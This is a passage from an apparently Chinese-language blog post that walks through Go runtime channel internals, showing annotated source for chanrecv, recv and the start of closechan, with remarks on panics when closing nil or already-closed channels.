punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> ep <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t\t<span class=\"token function\">typedmemclr</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token keyword\">var</span> t0 <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token keyword\">if</span> blockprofilerate <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\tt0 <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>qcount <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t\t\t<span class=\"token function\">raceacquire</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> ep <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t\t<span class=\"token function\">typedmemclr</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 通道已关闭，但通道的缓冲区中有数据。</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span>sendq<span class=\"token punctuation\">.</span><span class=\"token function\">dequeue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> sg <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 刚找到了等待的发送者且仍未关闭。</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t<span class=\"token comment\">// 找到等待的发送者。如果缓冲区大小为 0，则从发送者直接接收值。</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t\t<span class=\"token comment\">// 否则，从队列头接收数据，并将发送者的值添加到队列尾（因为队列已满）。</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t<span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>qcount <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t<span class=\"token comment\">// 直接从队列接收</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\tqp <span class=\"token operator\">:=</span> <span class=\"token function\">chanbuf</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ep <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t<span class=\"token function\">typedmemmove</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">,</span> qp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t<span class=\"token function\">typedmemclr</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> qp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>recvx<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\tc<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>qcount<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t<span class=\"token comment\">// 没有可用的发送者：在该通道上阻塞。</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\tgp <span class=\"token operator\">:=</span> <span class=\"token function\">getg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\tmysg <span class=\"token operator\">:=</span> <span class=\"token function\">acquireSudog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t<span class=\"token keyword\">if</span> t0 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\tmysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t<span class=\"token comment\">// 在分配 elem 和将 mysg 入队到 gp.waiting 之间不进行堆栈拆分</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token comment\">//copystack 可以找到它。</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> ep</pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>waitlink <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>waiting <span class=\"token operator\">=</span> mysg</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> gp</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>isSelect <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>recvq<span class=\"token punctuation\">.</span><span class=\"token function\">enqueue</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t<span class=\"token comment\">// 向任何试图缩小堆栈的人发出信号，表明我们即将在通道上阻塞。</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t<span class=\"token comment\">// 此 G 的状态改变与我们设置 gp.activeStackChans 之间的时间窗口对栈缩小不安全</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>parkingOnChan<span class=\"token punctuation\">.</span><span class=\"token function\">Store</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t<span class=\"token function\">gopark</span><span class=\"token punctuation\">(</span>chanparkcommit<span class=\"token punctuation\">,</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> waitReasonChanReceive<span class=\"token punctuation\">,</span> traceBlockChanRecv<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t<span class=\"token comment\">// 被唤醒</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t<span class=\"token keyword\">if</span> mysg <span class=\"token operator\">!=</span> gp<span class=\"token punctuation\">.</span>waiting <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"G waiting list is corrupted\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>waiting <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>activeStackChans <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t<span class=\"token keyword\">if</span> mysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t<span class=\"token function\">blockevent</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">.</span>releasetime<span class=\"token operator\">-</span>t0<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\tsuccess <span class=\"token operator\">:=</span> mysg<span class=\"token punctuation\">.</span>success</pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t<span class=\"token function\">releaseSudog</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> success</pre></td></tr><tr><td data-num=\"149\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//recv 处理满通道 c 上的接收操作。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 包含 2 部分：</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//  1. 由发送者 sg 发送的值被放入通道，并唤醒发送者去执行其他操作。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//  2. 接收者（当前 Goroutine）接收的值写入 ep。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 对于同步通道，两个值相同。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 对于异步通道，接收者从通道缓冲区获取其数据，而发送者的数据被放入通道缓冲区。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 通道 c 必须已满且被锁定。recv 用 unlockf 解锁 c。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//sg 必须已出列。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 非 nil 的 ep 必须指向堆或调用者的栈。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> sg <span class=\"token operator\">*</span>sudog<span class=\"token punctuation\">,</span> ep unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">,</span> unlockf <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> skip <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">racesync</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ep <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token comment\">// 从发送者拷贝数据</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token function\">recvDirect</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// 队列已满。取队列头的项目。使发送者将其项目入队到队列尾。</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token comment\">// 由于队列已满，这两个位置都是同一个槽。</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tqp <span class=\"token operator\">:=</span> <span class=\"token function\">chanbuf</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token comment\">// 从队列复制数据到接收者</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ep <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token function\">typedmemmove</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">,</span> qp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token comment\">// 从发送者复制数据到队列</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token function\">typedmemmove</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> qp<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>recvx<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\tc<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>sendx <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>recvx <span class=\"token comment\">// c.sendx = (c.sendx+1) % c.dataqsiz</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tsg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tgp <span class=\"token operator\">:=</span> sg<span class=\"token punctuation\">.</span>g</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token function\">unlockf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tsg<span class=\"token punctuation\">.</span>success <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token function\">goready</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">,</span> skip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"关闭\"><a class=\"anchor\" href=\"#关闭\">#</a> 关闭</h2>\n<p>在函数执行的最后会为所有被阻塞的 Goroutine 调用 goready 函数重新对这些协程进行调度.</p>\n<p>close nil channel 和  close 已经关闭的 channel 会导致 panic</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//go:linkname reflect_chanclose reflect.chanclose</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reflect_chanclose</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">closechan</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">closechan</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token function\">plainError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"close of nil channel\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token function\">plainError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"close of closed channel\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token 